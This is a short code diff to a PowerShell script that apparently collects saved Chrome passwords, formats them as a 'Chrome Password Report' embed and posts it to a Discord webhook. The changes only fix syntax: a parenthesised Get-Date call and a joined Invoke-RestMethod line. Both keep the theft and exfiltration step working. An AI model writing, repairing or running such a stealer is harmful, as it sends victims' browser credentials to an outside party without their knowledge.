@@ -144,7 +144,7 @@ try {
         title = "Chrome Password Report"
         description = "```json`n$displayOutput`n```"
         color = $color
-        timestamp = Get-Date -Format o
+        timestamp = (Get-Date -Format o)
     }
     
     $payload = @{
@@ -154,8 +154,7 @@ try {
     
     # Send to Discord
     $jsonPayload = $payload | ConvertTo-Json -Depth 5 -Compress
-    Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonPayload `
-        -ContentType 'application/json' -ErrorAction Stop >$null
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonPayload -ContentType 'application/json' -ErrorAction Stop >$null
 }
 catch {
     Write-Host "⚠️ Final Error: $_"
